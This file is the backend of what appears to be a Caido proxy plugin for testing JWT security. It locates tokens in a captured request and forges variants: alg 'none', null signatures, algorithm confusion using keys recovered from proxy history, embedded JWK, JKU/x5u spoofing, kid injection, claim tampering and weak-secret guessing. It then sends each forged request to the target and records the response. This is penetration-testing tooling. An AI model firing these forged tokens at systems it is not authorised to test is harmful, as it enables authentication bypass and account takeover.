import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
import { RequestSpec } from "caido:utils";

import { parseJWT, getAlgorithmFamily } from "./crypto/jwt.js";
import { buildNoneAttacks } from "./attacks/none.js";
import { buildNullSigAttacks } from "./attacks/nullSig.js";
import { buildAlgConfusionAttacks } from "./attacks/algConfusion.js";
import { buildEmbeddedJWKAttacks } from "./attacks/embeddedJwk.js";
import { buildJKUSpoofAttacks } from "./attacks/jkuSpoof.js";
import { buildKIDInjectionAttacks } from "./attacks/kidInject.js";
import { buildClaimTamperAttacks } from "./attacks/claimTamper.js";
import { buildWeakSecretAttacks } from "./attacks/weakSecret.js";
import { recoverPublicKeyFromJWTs } from "./crypto/keyRecovery.js";
import { parseCookies, looksLikeJWT } from "./util.js";
import type {
  AttackResult,
  JwtLocation,
  ParsedJWT,
  PluginConfig,
} from "./types.js";

// Minimal interface matching the Caido RequestSpec surface we actually use
interface IRequestSpec {
  getHeaders(): Record<string, string[]>;
  getBody?(): { toText?(): string; toRaw?(): Uint8Array } | undefined;
  setHeader(name: string, value: string): void;
  setBody(body: string): void;
  getRaw(): unknown;
  getHost(): string;
  getPort(): number;
  getTls(): boolean;
}

// ─── Events emitted to frontend ────────────────────────────────────────────

export type BackendEvents = DefineEvents<{
  "jwt-attack-started": (data: { sessionId: string; requestId: string; total: number }) => void;
  "jwt-attack-result": (data: { sessionId: string; result: AttackResult }) => void;
  "jwt-attack-complete": (data: { sessionId: string; errors: string[] }) => void;
  "jwt-key-recovery-progress": (data: { sessionId: string; message: string }) => void;
  "jwt-key-recovery-complete": (data: { sessionId: string; keys: string[] }) => void;
  "jwks-payload": (data: { sessionId: string; jwksJson: string; privateKeyPem: string }) => void;
}>;

// ─── RPC API exposed to frontend ────────────────────────────────────────────

async function attackJwt(
  sdk: SDK<API, BackendEvents>,
  requestId: string,
  config: PluginConfig
): Promise<{ sessionId: string }> {
  const sessionId = Math.random().toString(36).slice(2);
  const errors: string[] = [];

  // Run asynchronously so we can return the sessionId immediately
  (async () => {
    // Fetch the original request
    const reqResp = await sdk.requests.get(requestId);
    if (!reqResp) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
      return;
    }

    const { request } = reqResp;
    const spec = request.toSpec() as unknown as IRequestSpec;

    // Find JWTs in the request
    const locations = findJWTsInSpec(spec);
    if (locations.length === 0) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request"] });
      return;
    }

    // Use the first JWT for now (UI can support multiple later)
    const loc = locations[0];
    const originalJWT = loc.jwt;

    let parsed: ParsedJWT;
    try {
      parsed = parseJWT(originalJWT);
    } catch (e) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: [`JWT parse failed: ${(e as Error).message}`] });
      return;
    }

    // ── Key recovery from HTTP history ─────────────────────────────────────
    const recoveredKeys: string[] = [];
    const algFamily = getAlgorithmFamily(parsed.header.alg as string);
    if (
      config.enabledAttacks.algConfusion &&
      (algFamily === "RS" || algFamily === "PS" || algFamily === "ES")
    ) {
      try {
        const historyJWTs = await collectHistoryJWTs(sdk, request.getHost(), 100);
        if (historyJWTs.length >= 2) {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: `Found ${historyJWTs.length} JWTs in history — attempting key recovery…`,
          });
          const keyResults = await recoverPublicKeyFromJWTs(
            historyJWTs,
            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg })
          );
          for (const r of keyResults) {
            recoveredKeys.push(r.publicKeyPem);
          }
          sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
        }
      } catch { /* non-fatal */ }
    }

    // ── Build all attack variants ──────────────────────────────────────────
    const attacks: AttackResult[] = [];

    const merge = (arr: AttackResult[]) => attacks.push(...arr);

    if (config.enabledAttacks.none) merge(buildNoneAttacks(parsed));
    if (config.enabledAttacks.nullSig) merge(buildNullSigAttacks(parsed));
    if (config.enabledAttacks.embeddedJwk) merge(buildEmbeddedJWKAttacks(parsed));
    if (config.enabledAttacks.kidInject) merge(buildKIDInjectionAttacks(parsed));
    if (config.enabledAttacks.claimTamper) merge(buildClaimTamperAttacks(parsed));

    if (config.enabledAttacks.weakSecret) {
      merge(await buildWeakSecretAttacks(parsed, config, originalJWT));
    }

    if (config.enabledAttacks.jkuSpoof || config.enabledAttacks.x5uSpoof) {
      const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, config);
      merge(spoofAttacks);
      if (jwksContent && jwksKey) {
        sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
      }
    }

    if (config.enabledAttacks.algConfusion) {
      const confusionAttacks = await buildAlgConfusionAttacks(
        parsed,
        request.getHost(),
        request.getPort(),
        request.getTls(),
        config,
        recoveredKeys
      );
      merge(confusionAttacks);
    }

    sdk.api.send("jwt-attack-started", {
      sessionId,
      requestId,
      total: attacks.length,
    });

    // ── Send each attack request ───────────────────────────────────────────
    for (const attack of attacks) {
      try {
        const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
        const start = Date.now();
        const sent = await sdk.requests.send(attackSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
        const durationMs = Date.now() - start;

        attack.requestId = sent.request?.getId();
        attack.durationMs = durationMs;

        if (sent.response) {
          attack.responseStatus = sent.response.getCode();
          const body = sent.response.getBody();
          const bodyText = body ? await bodyToText(body) : "";
          attack.responseLength = bodyText.length;
          attack.responseBody = bodyText.slice(0, 4096); // truncate for UI
          const headers = sent.response.getHeaders();
          attack.responseHeaders = flattenHeaders(headers);
        }
      } catch (e) {
        attack.error = (e as Error).message;
        errors.push(`[${attack.techniqueName}] ${attack.error}`);
      }

      sdk.api.send("jwt-attack-result", { sessionId, result: attack });
    }

    sdk.api.send("jwt-attack-complete", { sessionId, errors });
  })().catch((e) => {
    sdk.api.send("jwt-attack-complete", { sessionId, errors: [(e as Error).message] });
  });

  return { sessionId };
}

async function getJWTsInRequest(
  sdk: SDK<API, BackendEvents>,
  requestId: string
): Promise<JwtLocation[]> {
  const reqResp = await sdk.requests.get(requestId);
  if (!reqResp) return [];
  return findJWTsInSpec(reqResp.request.toSpec() as unknown as IRequestSpec);
}

// ─── Helpers ────────────────────────────────────────────────────────────────

function findJWTsInSpec(spec: IRequestSpec): JwtLocation[] {
  const locations: JwtLocation[] = [];

  const headers = spec.getHeaders() as Record<string, string[]>;

  // Authorization: Bearer <jwt>
  const authVals: string[] = headers["authorization"] ?? headers["Authorization"] ?? [];
  for (const val of authVals) {
    const match = val.match(/^(Bearer\s+)(.+)$/i);
    if (match && looksLikeJWT(match[2])) {
      locations.push({ type: "header", headerName: "Authorization", prefix: match[1], jwt: match[2] });
    } else if (looksLikeJWT(val)) {
      locations.push({ type: "header", headerName: "Authorization", prefix: "", jwt: val });
    }
  }

  // Cookie header
  const cookieVals: string[] = headers["cookie"] ?? headers["Cookie"] ?? [];
  for (const cookieStr of cookieVals) {
    const cookies = parseCookies(cookieStr);
    for (const [name, value] of Object.entries(cookies)) {
      if (looksLikeJWT(value)) {
        locations.push({ type: "cookie", cookieName: name, jwt: value });
      }
    }
  }

  // Custom JWT headers
  for (const name of ["X-Auth-Token", "X-Access-Token", "X-JWT-Token", "Token"]) {
    const vals: string[] = headers[name.toLowerCase()] ?? headers[name] ?? [];
    for (const val of vals) {
      if (looksLikeJWT(val)) {
        locations.push({ type: "header", headerName: name, prefix: "", jwt: val });
      }
    }
  }

  // JSON body
  const body = spec.getBody?.();
  if (body) {
    try {
      const text = typeof body.toText === "function" ? body.toText() : body.toString();
      const json = JSON.parse(text) as Record<string, unknown>;
      for (const key of ["token", "access_token", "id_token", "jwt", "auth_token", "refresh_token"]) {
        if (typeof json[key] === "string" && looksLikeJWT(json[key] as string)) {
          locations.push({ type: "body-json", jsonKey: key, jwt: json[key] as string });
        }
      }
    } catch { /* ignore */ }
  }

  return locations;
}

function cloneSpecWithJWT(
  original: IRequestSpec,
  loc: JwtLocation,
  newJWT: string
): IRequestSpec {
  const clone = RequestSpec.parse(original.getRaw() as Parameters<typeof RequestSpec.parse>[0]) as unknown as IRequestSpec;

  if (loc.type === "header" && loc.headerName) {
    clone.setHeader(loc.headerName, `${loc.prefix ?? ""}${newJWT}`);
  } else if (loc.type === "cookie" && loc.cookieName) {
    const headers = clone.getHeaders() as Record<string, string[]>;
    const cookieVals: string[] = headers["cookie"] ?? headers["Cookie"] ?? [];
    const cookieStr = cookieVals[0] ?? "";
    const cookies = parseCookies(cookieStr);
    cookies[loc.cookieName] = newJWT;
    const newCookie = Object.entries(cookies)
      .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
      .join("; ");
    clone.setHeader("Cookie", newCookie);
  } else if (loc.type === "body-json" && loc.jsonKey) {
    const body = clone.getBody?.();
    if (body) {
      try {
        const text = typeof body.toText === "function" ? body.toText() : body.toString();
        const json = JSON.parse(text) as Record<string, unknown>;
        json[loc.jsonKey] = newJWT;
        clone.setBody(JSON.stringify(json));
      } catch { /* ignore */ }
    }
  }

  return clone;
}

async function bodyToText(body: unknown): Promise<string> {
  if (typeof body === "string") return body;
  if (body && typeof (body as { toText?: () => string }).toText === "function") {
    return (body as { toText: () => string }).toText();
  }
  if (body && typeof (body as { toRaw?: () => Uint8Array }).toRaw === "function") {
    return Buffer.from((body as { toRaw: () => Uint8Array }).toRaw()).toString("utf8");
  }
  return "";
}

function flattenHeaders(headers: Record<string, string[]>): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [k, vs] of Object.entries(headers)) {
    out[k] = vs.join(", ");
  }
  return out;
}

async function collectHistoryJWTs(
  sdk: SDK<API, BackendEvents>,
  host: string,
  limit: number
): Promise<ParsedJWT[]> {
  const results: ParsedJWT[] = [];
  try {
    const page = await sdk.requests
      .query()
      .descending("req", "id")
      .first(limit)
      .execute();

    // RequestsConnection — cast to access items array
    const conn = page as unknown as { items?: Array<{ request?: { getHost(): string; toSpec(): unknown } }> };
    for (const item of conn.items ?? []) {
      if (!item.request || item.request.getHost() !== host) continue;
      const spec = item.request.toSpec() as unknown as IRequestSpec;
      const locs = findJWTsInSpec(spec);
      for (const loc of locs) {
        try {
          const parsed = parseJWT(loc.jwt);
          const fam = getAlgorithmFamily(parsed.header.alg as string);
          if (fam === "RS" || fam === "PS") {
            results.push(parsed);
            if (results.length >= 10) return results;
          }
        } catch { /* ignore */ }
      }
    }
  } catch { /* ignore */ }
  return results;
}

// ─── API definition ─────────────────────────────────────────────────────────

export type API = DefineAPI<{
  attackJwt: typeof attackJwt;
  getJWTsInRequest: typeof getJWTsInRequest;
}>;

export function init(sdk: SDK<API, BackendEvents>): void {
  sdk.api.register("attackJwt", attackJwt);
  sdk.api.register("getJWTsInRequest", getJWTsInRequest);
}
